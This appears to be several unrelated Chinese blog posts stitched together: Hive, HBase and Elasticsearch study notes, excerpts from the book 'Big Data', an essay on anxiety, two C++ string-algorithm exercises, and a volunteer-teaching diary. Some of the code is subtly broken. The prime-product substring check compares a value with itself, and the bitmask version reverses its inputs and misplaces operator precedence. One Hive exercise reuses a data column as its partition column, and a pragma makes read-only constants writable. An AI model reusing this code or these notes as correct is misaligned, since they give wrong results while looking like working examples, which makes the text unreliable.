1、Hive的设计目标是使Hadoop上的数据操作与传统SQL相结合，让熟悉SQL编程开发人员能够轻松向Hadoop平台迁移 
2、Hive提供类似SQL的查询语言HQL，HQL在底层被转换为相应的MapReduce操作 
3、Hive在HDFS上构建数据仓库来存储结构化的数据，这些数据一般来源与HDFS上的原始数据，使用Hive可以对这些数据执行查询、分析等操作。
3.Hive的数据模型
1、Hive数据库2、内部表3、外部表4、分区5、桶6、Hive的视图 
Hive在创建内部表时，会将数据移动到数据仓库指向的路径，若创建外部表，仅记录数据所在的路径，不对数据位置做任何改变，在删除表的时候，内部表的元数据和数据会被一起删除，外部表只会删除元数据，不删除数据。这样来说，外部表要比内部表安全，数据组织液更加灵活，方便共享源数据。
4.Hive的调用方式
1、Hive Shell  
2、Thrift  
3、JDBC 
4、ODBC
5.Hive的运行机制
1、将sql转换成抽象语法树 
2、将抽象语法树转化成查询块 
3、将查询块转换成逻辑查询计划（操作符树） 
4、将逻辑计划转换成物理计划（M\Rjobs）
6.Hive的优势
1、并行计算 
2、充分利用集群的CPU计算资源、存储资源 
3、处理大规模数据集 
4、使用SQL，学习成本低
7.Hive应用场景
1、海量数据处理  
2、数据挖掘 
3、数据分析  
4、SQL是商务智能工具的通用语言，Hive有条件和这些BI产品进行集成
8.Hive不适用场景
1、复杂的科学计算 
2、不能做到交互式的实时查询 
9.Hive和数据库（RDBMS）的区别
1、数据存储位置。Hive是建立在Hadoop之上的，所有的Hive的数据都是存储在HDFS中的。而数据库则可以将数据保存在块设备或本地文件系统中。 
2、数据格式。Hive中没有定义专门的数据格式，由用户指定，需要指定三个属性：列分隔符，行分隔符，以及读取文件数据的方法。数据库中，存储引擎定义了自己的数据格式。所有数据都会按照一定的组织存储。 
3、数据更新。Hive的内容是读多写少的，因此，不支持对数据的改写和删除，数据都在加载的时候中确定好的。数据库中的数据通常是需要经常进行修改。 
4、执行延迟。Hive在查询数据的时候，需要扫描整个表（或分区），因此延迟较高，只有在处理大数据是才有优势。数据库在处理小数据是执行延迟较低。 
5、索引。Hive没有，数据库有 
6、执行。Hive是MapReduce，数据库是Executor 
7、可扩展性。Hive高，数据库低 
8、数据规模。Hive大，数据库小
hive代码简单例子：

创建一个名为”test“的table
create table students (name string,age int,city string,class string) row format delimited fields terminated by ',';
load data local inpath "/opt/students.txt" into table students;

create EXTERNAL table IF NOT EXISTS studentX (name string,age int,city string,class string) partitioned by (grade string) ROW FORMAT DELIMITED FIELDS TERMINATED BY ',';
alter table studentX add partition (grade='excellent') location '/testM/excellent/';
alter table studentX add partition (grade='good') location '/testM/good/';
alter table studentX add partition (grade='moderate') location '/testM/moderate/';

#加载数据
load data inpath "/testtry/studentsm.txt" into table studentX partition (grade='excellent');
load data inpath "/testtry/students.txt" into table studentX partition (grade='good');
show partitions studentX;
select * from studentX where grade='excellent';

表删除操作：drop table students;
创建一个名为”test“的table
create table students (name string,age int,city string,class string) row format delimited fields terminated by ',';
load data local inpath "/bin/students.txt" into table students;

###
练习:创建外部表，指定数据存放位置

create EXTERNAL table IF NOT EXISTS studentX (name string,age int,city string,class string) partitioned by (class string) ROW FORMAT DELIMITED FIELDS TERMINATED BY ',';
alter table test add partition (class='one') location '/testmore/one';

对表进行查询
Select * from students;
分区表操作
hive>create table students (name string,age int,city string,class string) partitioned by (class string) row format delimited fields terminated by ',';
hive>load data local inpath "students.txt" into table students partition (class='one');
hive>show partitions students;
hive>select * from students where grade='two';

查询操作
group by、 order by、 join 、 distribute by、 sort by、 clusrer by、 union all
hive常见操作
常见的聚合操作
count(*) 所有值不全为NULL时，加1操作 
count(1) 不管有没有值，只要有这条记录，值就加1 
count(col) col列里面的值为null，值不会加1，这个列里面的值不为NULL，才加1

sum求和
sum(可转成数字的值） 返回bigint 
avg求平均值
avg（可转成数字的值）返回double 
distinct不同值个数
count(distinct col)

按照某些字段排序
select col1,other... from table where conditio order by col1,col2 [asc|desc] 

Join表连接
join等值连接（内连接），只有某个值在m和n中同时存在时。
left outer join 左外连接，左边表中的值无论是否在b中存在时，都输出；右边表中的值，只有在左边表中存在时才输出。
right outer join 和 left outer join 相反。 
Hbase 的模块：
**原子性（是指不会被线程调度机制打断的操作，这种操作一旦开始，就一直运行到结束，中间不会有任何contextswitch（切换到领一个线程）），一致性，隔离性，持久性

Region- Region用于存放表中的行数据
Region Server
- 一个Region Server包含多个Region
- 管理表格，以及实现读写操作
- Client会直接和Region Server通信获取数据

Master
-  协调多个Region Server
- 侦测各个Region Server的状态并平衡它们之间的workload
- 分配Region给Region Serer
- 允许多个Master节点，但是只有一个服务，其他是backup
- 和Zookeeper一起工作实现HA

Zookeeper
- Hbase中至关重要的模块
- 确保有一个Master处于Running的状态
- 注册Region和Region Server
- 属于Hbase容错性的一部分

HDFS
  - Hadoop 的分布式文件系统（Hadoop Distributed File System）

API
  - Hbase提供Java的Client API

列式存储格式 Parquet
Parquet 是面向分析型业务的列式存储格式，由 Twitter 和 Cloudera 合 
作开发， 2015 年 5 月从 Apache 的孵化器里毕业成为 Apache 顶级项 
目，最新的版本是 1.8.0 。
列式存储和行式存储相比的优势 :

可以跳过不符合条件的数据，只读取需要的数据，降低 IO 数据量。
压缩编码可以降低磁盘存储空间。由于同一列的数据类型是一样 
的，可以使用更高效的压缩编码（例如 Run Length Encoding 和 Delta 
Encoding ）进一步节约存储空间。
只读取需要的列，支持向量运算，能够获取更好的扫描性能。 
适用场景： 
在互联网大数据应用场景下，大部分情况下，数据量很大且数据字段 
数目很多，但每次查询数据只针对其中的少数几行，这时候列式存储

Hive操作
Hive

Hive查询语言-Hql 
-创建数据库 
  hive> CREATE DATABASE IF NOT EXISTS financials; 
  hive> SHOW DATABASES; 
  hive> DROP DATABASE IF EXISTS financials; 
-查看表 
hive>show tables;
创建表

其他知识点
MLlib是 
spark的可以扩展的机器学习库，由以下部分组成：通用的学习算法和工具类，包括分类，回归，聚类，协同过滤，降维
数据分析常见模式： 
1、Iterative Algorithms， 
2、Relational Queries， 
3、MapReduce， 
4、Stream Processing
Scala的好处： 
1、面向对象和函数式编程理念加入到静态类型语言中的混合体 
2、Scala的兼容性—-能够与Java库无缝的交互 
3、Scala的简洁性—-高效，更不容易犯错 
4、Scala的高级抽象 
5、Scala是静态类型—-类型推断 
6、Scala是可扩展的语言
ElasticSearch 基础代码：
ElasticSearch
查看集群健康状况
http://localhost:9200/_cluster/health?pretty
http://172.31.200.7:9200/_cluster/health?pretty
两个测试数据集合：book1.json
                        book2.json
文档建索引
curl -XPOST “localhost:9200/website/blog/123” -d@book.json
curl -XPOST "172.31.200.7:9200/website/blog/123" -d@book1.json
查询数据
http://localhost:9200/website/blog/_search?pretty
http://172.31.200.7:9200/website/blog/_search?pretty
搜索
Match_all & 只返回第一个文档
curl -XPOST ‘localhost:9200/website/_search?pretty' -d ' { "query": { "match_all": {} }, "size": 1 }' 
curl -XPOST '172.31.200.7:9200/website/_search?pretty' -d '{"query":{"match_all":{}}, "size": 1}'
Match_all &返回11到20的文档

 curl -XPOST 'localhost:9200/website/_search?pretty' -d ' { "query": { "match_all": {} }, "from": 10, "size": 10 }‘
curl -XPOST '172.31.200.7:9200/website/_search?pretty' -d '{"query":{"match_all":{}}, "from": 10, "size": 10 }'

7.基础问答题
1.你理解的Hive和传统数据库有什么不同？各有什么试用场景。
1、数据存储位置。Hive是建立在Hadoop之上的，所有的Hive的数据都是存储在HDFS中的。而数据库则可以将数据保存在块设备或本地文件系统中。 
2、数据格式。Hive中没有定义专门的数据格式，由用户指定，需要指定三个属性：列分隔符，行分隔符，以及读取文件数据的方法。数据库中，存储引擎定义了自己的数据格式。所有数据都会按照一定的组织存储。 
3、数据更新。Hive的内容是读多写少的，因此，不支持对数据的改写和删除，数据都在加载的时候中确定好的。数据库中的数据通常是需要经常进行修改。 
4、执行延迟。Hive在查询数据的时候，需要扫描整个表（或分区），因此延迟较高，只有在处理大数据是才有优势。数据库在处理小数据是执行延迟较低。 
5、索引。Hive没有，数据库有 
6、执行。Hive是MapReduce，数据库是Executor 
7、可扩展性。Hive高，数据库低 
8、数据规模。Hive大，数据库小
2.Hive的实用场景如下：
1、Data Ingestion (数据摄取) 
2、Data Discovery(数据发现) 
3、Data analytics(数据分析) 
4、Data Visualization & Collaboration(数据可视化和协同开发)
SPSS统计分析在大数据的应用测试题—答案 
1. 大数据分析与挖掘方法论被称为CRISP-DM方法是以数据为中心迭代循环进行的六步活动，它们分别是：商业理解、数据理解、数据准备、建立模型_、模型评估、结果部署_。

数据分析挖掘方法大致包含 （ _A B C D E F ）： 
A.   分类 Classification 
B.  估计Estimation 
C.  预测Prediction 
D.  关联规则Association Rules 
E.  聚类Cluster 
F.  描述与可视化Description and Visualization
在数据分析与挖掘中对数据的访问性要求包括：交互性访问、批处理访问_、迭代计算、数据查询，HADOOP仅仅支持了其中批处理访问，而Spark则支持所有4种方式。

3.Spark作为计算框架的优势是什么？
1、Spark的中间数据放到内存中，对于迭代运算效率更高 
2、Spark比Hadoop更通用 
3、Spark提供了统一的编程接口 
4、容错性– 在分布式数据集计算时通过checkpoint来实现容错 
5、可用性– Spark通过提供丰富的Scala, Java，Python API及交互式Shell来提高可用性 






    说到大数据处理可能大家都不会陌生，这是近年来非常火热的话题，各行各业都想借助大数据为自己助力，有了这个工具，就好像在飞机上看农田一般清晰，一目了然，也也就是业内人士常说的大数据提供了一个------上帝视角
大数据的概念：

1、指的是所涉及的资料量规模巨大到无法通过目前主流软件工具，在合理的时间内达到撷取、管理、处理并整理成为帮助企业经营决策更积极目的的咨询。
2、维克托·迈尔-舍恩伯格以及肯尼斯·库克耶编写的《大数据时代》中大数据指不用随机分析法（抽样调查）这样的捷径，而采用所有数据进行分析处理。
3、海量异构的数据（包括文本、图像、声音等）。
大数据的4V特点：Volume（大量）、Velocity（高速）、Variety（多样）、Value（价值）


大数据处理的应用场景有很多：
1.阿里巴巴平台----淘宝双十一
2.证券交易系统
3.智慧城市
4.情报分析，舆情监控


大数据处理的的发展历史和架构演进，可以看成：
是从传统手工作坊（分布式批处理）到流水线工厂（hadoop）再到没有中间商 的O2O平台（spark）

开源工具简介---批处理
Hadoop Common：Hadoop体系最底层的一个模块，为Hadoop各子项目提供各种工具，如：配置文件和日志操作等。
HDFS：是Hadoop的分布式存储系统，同Google的GFS性质是一样的。
MapReduce：是一种编程模型，用于大规模数据集的并行运算。
Hive是基于Hadoop的一个数据仓库工具，提供简单的sql查询功能，可以将sql语句转换为MapReduce任务进行运行，十分适合数据仓库的统计分析。
 
Pig：Pig最大的作用就是对MapReduce算法(框架)实现了一套shell脚本 ，类似我们通常熟悉的SQL语句，在Pig中称之为Pig Latin。
Hbase：一个分布式、可扩展的大数据存储。它提供了大数据集上随机和实时的读/写访问，并针对了商用服务器集群上的大型表格做出优化——上百亿行，上千万列。它是Google bigtable的一个开源的实现。
Zookeeper:它是一个针对大型分布式系统的可靠协调系统，功能包括：配置维护、名字服务、 分布式同步、组服务等。ZooKeeper的目标就是封装好复杂易出错的关键服务，将简单易用的接口和性能高效、功能稳定的系统提供给用户。它是 Google的Chubby一个开源的实现。
 


舆情监控系统的系统流程：


最近去一个文科院校讲了一节课：基于大数据处理的舆情监控系统及其应用简介，ppt分享出来希望大家批评指正：
http://download.csdn.net/detail/wangyaninglm/9504994









作者：维克托·迈尔-舍恩伯格

最近看了一本有历史的书《大数据时代》（拿研究成果来说三年前的已经是老成果了），作者对 我们这个大数据时代产生了很多颇有意思的洞见，为了保持原汁原味，我就直接原封不懂的把他们保留下来了，有空的话推荐大家去看看，顺便看看书中提到的电影《少数派报告》，和《点球成金》.部分摘抄难免断章取义，还请大家多参照原书。








序
一 拥抱“大数据时代”
我们的行为、位置，甚至身体生理数据等每一点变化都成为了可被记录和分析的数据。以此为基础，“反馈经济”（feedback economy）等新经济、新商业模式也正在开始形成。
二 实实在在大数据
只要发现了两个现象之间存在的显著相关性，就可以创造巨大的经济或社会效益
译者序 在路上·晃晃悠悠
某些观念有时会以惊人的力量给知识状况带来巨大的冲击。由于这些观念能一下子解决许多问题，所以，它们似乎将有希望解决所有基本问题，澄清所有不明了的疑点。每个人都想迅速地抓住它们，作为进入某种新实证科学的法宝，作为可以用来建构一个综合分析体系的概念轴心。这种‘宏大概念’突然流行起来，一时间把几乎所有的东西都挤到了一边。
因为越是万能的，就越是空洞的！

引言 一场生活、工作与思维的大变革

这是当今社会所独有的一种新型能力： 
以一种前所未有的方式，通过对海量数据进行分析，获得有巨大价值的产品和服务，或深刻的洞见。
最惊人的是，社会需要放弃它对因果关系的渴求，而仅需关注相关关系。也就是说只需要知道是什么，而不需要知道为什么。这就推翻了自古以来的惯例，而我们做决定和理解现实的最基本方式也将受到挑战。
事情真的在快速发展。人类存储信息量的增长速度比世界经济的增长速度快4倍，而计算机数据处理能力的增长速度则比世界经济的增长速度快9倍。
大数据的核心就是预测 !!!
大数据时代的3个转变：
第一个转变就是，在大数据时代，我们可以分析更多的数据，有时候甚至可以处理和某个特别现象相关的所有数据，而不再依赖于随机采样。
第二个改变就是，研究数据如此之多，以至于我们不再热衷于追求精确度。
第三个转变因前两个转变而促成，即我们不再热衷于寻找因果关系。
大数据告诉我们“是什么”而不是“为什么”。在大数据时代，我们不必知道现象背后的原因，我们只要让数据自己发声。
大数据时代开启了一场寻宝游戏，而人们对于数据的看法以及对于由因果关系向相关关系转化时释放出的潜在价值的态度，正是主宰这场游戏的关键。


01 更多 不是随机样本，而是全体数据

采样分析的精确性随着采样随机性的增加而大幅提高，但与样本数量的增加关系不大。
采样忽视了细节考察。
这说明一般来说无论是针对一个小团体还是整个社会，多样性是有额外价值的。


02 更杂 不是精确性，而是混杂性

伟大的物理学家开尔文男爵曾说过：“测量就是认知。”
社会从“大数据”中所能得到的，并非来自运行更快的芯片或更好的算法，而是更多的数据。


03 更好 不是因果关系，而是相关关系

相关关系的核心是量化两个数据值之间的数理关系。相关关系强是指当一个数据值增加时，另一个数据值很有可能也会随之增加。
我们用数据驱动的关于大数据的相关关系分析法，取代了基于假想的易出错的方法。
通过找出一个关联物并监控它，我们就能预测未来。
用一系列的因果关系来验证各种猜想的传统研究范式已经不实用了，如今它已经被无需理论指导的纯粹的相关关系研究所取代。


04 数据化 一切皆可“量化”

庞大的数据库有着小数据库所没有的价值
大数据的核心就是挖掘出庞大的数据库独有的价值。

“数据化”——这是指一种把现象转变为可制表分析的量化形式的过程。

“文化组学”是一个计算机专业词汇，指的就是通过文本的定量分析来揭示人类行为和文化发展的趋势。
个人会偿还债务的可能性和其朋友会偿还债务的可能性呈正相关。正应了一句老话：物以类聚，人以群分。
2011年《科学》杂志上的一项研究显示，来自世界上不同文化背景的人们每天、每周的心情都遵循着相似的模式
这个它，就是无处不在的数据化。像其他的基础设施那样，它会给社会带来根本性的变革。


05 价值 取之不尽，用之不竭”的数据创新

数据的潜在价值有三种最为常见的释放方式：基本再利用、数据集整合和寻找“一份钱两份货”。而数据的折旧值、数据废气和开放数据则是更为独特的方式。
一位谷歌的员工说：“我们喜欢从大的‘噪音’数据集中吸取教训。”
事实上，政府才是大规模信息的原始采集者，并且还在与私营企业竞争他们所控制的大量数据。
奥巴马的指令促成了data.gov网站的建立，这是美国联邦政府的公开信息资料库。
公司账面价值和市场价值之间的差额被记为“无形资产”


06 角色定位 数据、技术与思维的三足鼎立

数据科学家是统计学家、软件程序员、图形设计师与作家的结合体。

“如果你想成功，你不应该成为一个普通的、可被随意替代的人，你应该成为稀缺的、不可替代的那类人，”

如果一个人在下午四点左右给汽车加油的话，他很可能在接下来的一个小时内要去购物或者去餐馆吃饭，而这一个小时的花费大概在35～50美元之间。商家可能正需要这样的信息，因为这样它们就能在这个时间段的加油小票背面附上加油站附近商店的优惠券。
如果病人出院之后的医学干预是以解决病人的心理问题为重心，可能会更有利于他们的身体健康。这样就可以提供更好的健康服务，降低再入院率和医疗成本。
所谓大数据思维，是指一种意识，认为公开的数据一旦处理得当就能为千百万人急需解决的问题提供答案。
谁在这个大数据价值链中获益最大呢？现在看来，应该是那些拥有大数据思维或者说创新性思维的人。
现在，国外的外包公司使得基础的计算机编程技术越来越廉价，如今它甚至成为了世界贫困人口的致富驱动力，而不再代表着高端技术。
2011年，美国经济复苏开始放缓，虽然政客们强烈否定，但是这个信息还是被交通状况分析给披露了出来。Inrix的分析发现，上下班高峰时期的交通状况变好了，这也就说明失业率增加了，经济状况变差了。
影片《点球成金》改编自迈克尔·刘易斯的《魔球——逆境中制胜的智慧》。讲述的是一个真实的故事，介绍奥克兰运动家棒球队（又称绿帽队或白象队）总经理比利·比恩（Billy Beane）的经营哲学，描写了他抛弃几百年一直依赖的选择球员的传统惯例，采用了一种依靠电脑程序和数学模型分析比赛数据来选择球员的方法。 

人类从依靠自身判断做决定到依靠数据做决定的转变，也是大数据做出的最大贡献之一。行业专家和技术专家的光芒都会因为统计学家和数据分析家的出现而变暗，因为后者不受旧观念的影响，能够聆听数据发出的声音。他们的判断建立在相关关系的基础上，没有受到偏见和成见的影响
随着大数据能够越来越精确地预测世界的事情以及我们所处的位置，我们可能还没有准备好接受它对我们的隐私和决策过程带来的影响。


07 风险 让数据主宰一切的隐忧

互联网的出现使得监视变得更容易、成本更低廉也更有用处。
大数据还会带来更多的威胁，毕竟，大数据的核心思想就是用规模剧增来改变现状。
大数据时代，很多数据在收集的时候并无意用作其他用途，而最终却产生了很多创新性的用途。
我们把谷歌街景作为一个例子来看，谷歌的图像采集车在很多国家采集了道路和房屋的图像（以及很多备受争议的数据）。但是，德国媒体和民众强烈地抗议了谷歌的行为，因为民众认为这些图片会帮助黑帮窃贼选择有利可图的目标。有的业主不希望他的房屋或花园出现在这些图片上，顶着巨大的压力，谷歌同意将他们的房屋或花园的影像模糊化。但是这种模糊化却起到了反作用，因为你可以在街景上看到这种有意识的模糊化，对盗贼来说，这又是一个此地无银三百两的例子。
约翰·安德顿（John Anderton）是华盛顿特区警局预防犯罪组的负责人。这是特别的一天，早上，他冲进了住在郊区的霍华德·马克斯（Howard Marks）的家中并逮捕了他，后者打算用剪刀刺杀他的妻子，因为他发现他妻子给他戴了“绿帽子”。安德顿又防止了一起暴力犯罪案件的发生。他大声说：“我以哥伦比亚特区预防犯罪科的名义逮捕你，你即将在今天谋杀你的妻子萨拉·马克斯（Sarah Marks）……”其他的警察开始控制霍华德，霍华德大喊冤枉，“我什么都没有做啊！”这是电影《少数派报告》（Minority Report）开始时的场景，这部电影描述的是一个未来可以准确预知的世界，而罪犯在实施犯罪前就已受到了惩罚。人们不是因为所做而受到惩罚，而是因为将做，即使他们事实上并没有犯罪。 

在未来，我们不仅会失去选择的权利，而且会按照预测去行动。如果精准的预测成为现实的话，我们也就失去了自由意志，失去了自由选择生活的权利。
这是一个典型的滑坡，可能直接导致《少数派报告》中的情况成为现实——我们将生活在一个没有独立选择和自由意志的社会，在这里我们的道德指标将被预测系统所取代，个人一直受到集体意志的冲击。简单地说，如果一切都成为现实，大数据就会把我们禁锢在可能性之中。
谷歌就是在重蹈前人覆辙，过去美国的科技巨头们也把个人简历看得比个人能力重要。如果按谷歌的做法，其创始人都没有资格成为传奇性的贝尔实验室的经理，因为他们都在博士阶段辍学了；比尔·盖茨和马克·扎克伯格也都会被淘汰，因为他们都没有大学文凭。
史蒂夫·乔布斯多年来持续不断地改善Mac笔记本，依赖的可能是行业分析，但是他发行的iPod、iPhone和iPad靠的就不是数据，而是直觉——他依赖于他的第六感。当记者问及乔布斯苹果推出iPad之前做了多少市场调研时，他那个著名的回答是这样的：“没做！消费者没义务去了解自己想要什么。”


08 掌控 责任与自由并举的信息管理

永不磨灭的数字记录让人无法告别过去。我们的个人数据就像达摩克利斯之剑一样悬在头上，多年之后也会因为一件私事或者一次遗憾的购买记录而被翻出来再次刺痛我们。
大数据将要求一个新的人群来扮演这种角色，也许他们会被称作“算法师”。他们有两种形式：在机构外部工作的独立实体和机构内部的工作人员——正如公司有内部的会计人员和进行鉴证的外部审计师。 
结语 正在发生的未来
大数据为我们提供的不是最终答案，只是参考答案
对于善于运用科技解读未来的人来说，我们的未来不再是只字未书的画布，而是似乎已经着上了淡淡的墨痕。未来的可预知性似乎缩小了塑造命运的空间。潜在的可能性在概率的圣坛上被解剖。[插图]与此同时，大数据又意味着我们将永远受困于过去的行为，这些行为在预知我们下一步动作的预测过程中与我们作对，即我们永远无法逃避已发生的事。莎士比亚曾写道：“凡是过去，皆为序曲。”大数据通过运算将这句话铭刻，无论结果好坏——无论这句话是否会浇熄我们迎接下一个日出的热情，是否会打击我们留名于世的渴望。
没有什么是上天注定的，因为我们总能就手中的信息制定出相应的对策。
我们能收集和处理的数据只是世界上极其微小的一部分。这些信息不过是现实的投影——柏拉图洞穴上的阴影罢了。因为我们无法获得完美的信息，所以做出的预测本身就不可靠。但这也不代表预测就一定是错的，只是永远不能做到完善。这也并未否定大数据的判断，而只是让大数据发挥出了应有的作用。大数据提供的不是最终答案，只是参考答案，为我们提供暂时的帮助，以便等待更好的方法和答案出现。这也提醒我们在使用这个工具的时候，应当怀有谦恭之心，铭记人性之本。
 







作者： 赵蕾     我们每天努力的工作，学习，生活，无非是为了成就更好的自己。这个自己，包括社会属性的自己：比如成为更好的父母、儿女、丈夫、妻子，比如成为更有能力的合作者，比如拥有更强大的影响力。。。     就我而言，我想有个好身材，在讲台上拥有更好的表现力，能够在自己钻研的方向取得更好的成绩。     总而言之，生活就是这样，因为我们尚有不足，所以才有前进的动力。     正是如此，前进中，适当的焦虑是推动这个进程必要的能量来源，增强我们的责任感。     但是，过度的焦虑，消耗我们的精神和心情，使自己感到不安和无力。     “明天还有一大堆事，可我现在睡不着，真的好想快点入睡，可是好像一个完成不了的作业一样，越逼着自己入睡，越睡不着”     “我每天都有做不完的事情，我很努力，可是我总是成为不了优秀的人，身边的人好像都活的很轻松，只有我这么累”     “下个月就要交稿了，我还没有头绪，这个合作对我很重要，搞砸了怎么办，而且好像真的要搞砸了，好着急，又似乎无能为力” 长期被如上所述的心理状态所控制，会感觉无法控制自己的心绪，坐立不安，缺乏耐心，容易疲劳、愤怒。事实上，我们很多时候会习以为常这些感觉，并没有察觉到我们正在焦虑。而是陷入一个焦虑，挫折，更为焦虑的恶性循环。     如何摆脱困境，我们先从焦虑的根源说起并解决它     1.压力。在心理学上，压力是个体在察觉“需求”与“满足需求”的能力不平衡感。解决办法 ·         制定长远的目标，目光放在远处，远处有美好的憧憬，并深信自己可以实现，不为眼前的挫折和暂时的失利所扰动 ·         保持匠人心态，不要过多在意甚至担忧结果，着手去做，采取具体的计划或措施去解决带来压力的相应问题，专注于解决问题过程中的互动与思考。 ·         困境可以使你成为哲学家，深入一些哲学思考，梳理、淡化压力带给个人的精神困扰。     2.认同危机。自我认同感缺失，为别人的评价而活，就是我们常说的“低自尊者”。解决办法 ·         认识自己的优点，善于利用自己的优点多做些发挥自我价值的事情，增强自信。 ·         正确看待自己的缺点，不要试着屏蔽或遮掩它，学着适应并与它共存。 ·         保持一颗宽容的心，能宽容自己的缺点，同时也接受别人的优点。试着走近、了解你认为“优秀”的人，不要通过自己和他人的看法来认识TA     3.完美主义者。一定要时刻展示最好的一面，担心失败，失败后异常沮丧和压抑，总是背着沉重的精神包袱。         说到这里，我并不想举例1，2，3了，因为我本人就是这种类型。有很多不切实际的想法，过分执着，以至于做事分不清轻重缓急，找不到生活的本质       对于这类原因产生的焦虑，我个人的建议多读书体会各种人生，多关心家庭还原生活原本的样子，放下那些你认为“必须要实现”的东西和必须要“必须要活成”的样子     心绪不宁的时候，做些没有没有明确目的事情。比如我喜欢收拾厨房，用毛巾擦地，一个一个马赛克的擦，看着它们一格格的从油烟中“鲜亮”出来，这些简单的收获与快乐，会使心情平静许多。生活无非是这样，玩味这缕人间烟火，没有什么不可放下的，  







这两天，看到各大公司找工作的情况跟要求，准备开始每个星期做点算法小程序
练习一下基础，今天先搞一个字符串左移
原理:



下面是代码：

// StringLeft.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "string.h"


char * invert(char *start,char *end)
{

	char tmp,*ptmp = start;
	while (start != NULL &&end != NULL && start < end)
	{
		tmp = (*start);
		(*start) = (*end);
		(*end) = tmp;
		start++;
		end--;

	}
	return ptmp;
}

char *left(char *s, int pos)
{
	int len = strlen(s);
	invert(s,s + (pos - 1));
	invert(s + pos, s + (len -1));
	invert(s, s + (len - 1));
	return s;
}
int _tmain()
{
	char s[] = "abcdef";//注意字符串常量的问题
	///char *s = new char[10];
	//s = "abcdef";
	//strcmp(s,"abcdef");
	printf(s);

	printf("\n");

	left(s,3);
	printf(s);

	printf("\n");


	getchar();

	return 0;
}







#pragma comment(linker,"/SECTION:.rdata,RW")
//加这句可以让常量区可写，后果自负！
//赵老师给的编译器设置，测试可以使用，char *s = "abcedf";都能改



上述文章引用了大牛博客的内容：
http://blog.csdn.net/v_JULY_v

﻿﻿






两个思路，都是把字符串转换为其他数字，完后进行数字的运算，素数的运算，或者我们熟知的打点法，或者是hash算法。
 
问题代码来源：
 
http://blog.csdn.net/v_JULY_v
 

 
 
// algorithm_sub_string.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <iostream>
#include <string>

using namespace std;

int prime[26] = {2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97,101};

bool AcontainsB(const char *A, const char *B)// 位运算的版本
{
	int have = 0;
	while (*B)
	{
		have = have|(1 << (*(B++) - 'a')) ;
	}

	while (*A)
	{
		if (have & (1 << (*(A++) - 'a')) == 0)
		{
			return false;
		}
	}

	return true;
}

int _tmain(int argc, _TCHAR* argv[])
{

	string strOne = "adfadfe";
	string strTwo = "ad";

	int sumIndex = 1;

	//遍历长字符串
	for (int i = 0;i < strOne.length();i++)
	{
		sumIndex = sumIndex * prime[(strOne[i] - 'a')];
	}

	int sumTwo = 1;
	//遍历短字符串
	for (int j = 0;j < strTwo.length();j++)
	{
		sumTwo = sumTwo * prime[(strTwo[j] - 'a')];
	}

	if (sumIndex % sumIndex == 0)
	{
		cout<<"include the short string!"<<endl;
	}

	if (AcontainsB(strOne.c_str(),strTwo.c_str()))
	{
		cout<<"include the short string!"<<endl;
	}

	getchar();

	return 0;
}



 






﻿﻿
有一首歌叫做《校园的早晨》
沿着校园熟悉的小路  清晨来到树下读书
初升的太阳照在脸上  也照着身旁这棵小树
亲爱的伙伴亲爱的小树  和我共享阳光雨露
请我们记住这美好时光  直到长成参天大树
请我们记住这美好时光  直到长成参天大树
 
 
沿着校园熟悉的小路  清晨来到树下读书。初升的太阳照在脸上  也照着身旁这棵小树，没有比这首《校园的早晨》更贴切的形容我们本次支教的官村小学了。马蹄形的布局，校园中间种满了小树，给人一种郁郁葱葱蓬勃朝气的感觉。每天清晨我们抵达学校的第一件事就是和同学们一起在这首歌伴奏下做早操。来支教之前我是学计算机的，我在想我只是一个爱好篮球的非专业运动员，我能带好体育，篮球课么。然而回首这么多年的篮球体育生涯，我也获得过不少奖励，担任了不少类似老师的领队，教练等职务，我还是信心满满的。
 
第一个百个馒头
 
     这次支教的官村小学由于整个村子都是同姓的人，可能都是亲戚，又或许是见惯了的原因，学生和老师之间可能彼此进入了疲劳期，相互之间有些厌倦。这就造成了学生对老师的教导变得麻木。
 

 
    了解到这样的情况，孙老师就给我们讲了个故事，一个乞丐乞讨，别人给他馒头，前99个给他馒头的人他都没有记住，因为他没有吃饱，吃到第100个馒头他吃饱了，他就会记住这给他100个馒头的人，对于学生们来说我们支教的老师应该做这个给他100个馒头的人。我第一节上体育课的时候发现孩子们都穿的拖鞋，甚至穿裙子，有点惊讶就随口叮嘱同学们说：希望以后有运动鞋的同学们把鞋穿上最好也穿上运动裤，这样可以避免同学们在运动的时候受伤。结果第二天同学们都穿上了新的鞋子。既然随口的一声叮嘱学生们都牢记在心，也许更高层次的鞭策能在这里学生的心底种下一颗种子，那我们也就不虚此行了。
 
我的篮球课
    为期一周的支教时间总共给我安排了10节篮球课，合计合计发现还是足够给一个零基础的同学全方位立体的篮球感知。课程主要围绕篮球小知识和篮球运动本身来进行。篮球小知识穿用来插在课堂教学中，
篮球小知识主要包括：
1.篮球运动的起源
2.篮球运动的场地，篮球的器材规范
3.篮球比赛的基本规则（国际篮联的规则为准）
4.篮球裁判的简单手势
 
    在讲篮球运动本身之前，由于考虑到篮球是一项剧烈运动，给孩子们教了8个小节的拉伸运动操，在运动之前充分的拉伸肌肉韧带和身体避免受伤。由于之前了解到孩子们都属于篮球零基础，所以我的课程不单要带动孩子们对体育运动以及篮球运动的热情，也要从篮球运动本身的三个基本要素讲起：运球，传球，投篮。要点包括，持球站立的三威胁姿势，原地运球传球，行进中运球传球，投篮，三步上篮。
 
    整体来看由于前几节课着重强调了篮球球性的训练，通过单手上举，单臂侧环，原地运球等动作的强调，孩子们后序的动作学习的非常快，虽然有点疏忽了左右手交替的运球，但在最后几节课的投篮游戏中孩子们基本都能做到单手从三分线运球到篮下投篮这样一个简单的进攻流程。非常令我开心的是，她们全部记住了我的篮球生命学说，这样形象的说法我觉的对于作为留守儿童的她们来说也算是能够找个倾诉的伙伴。
 
德基金大家庭
 
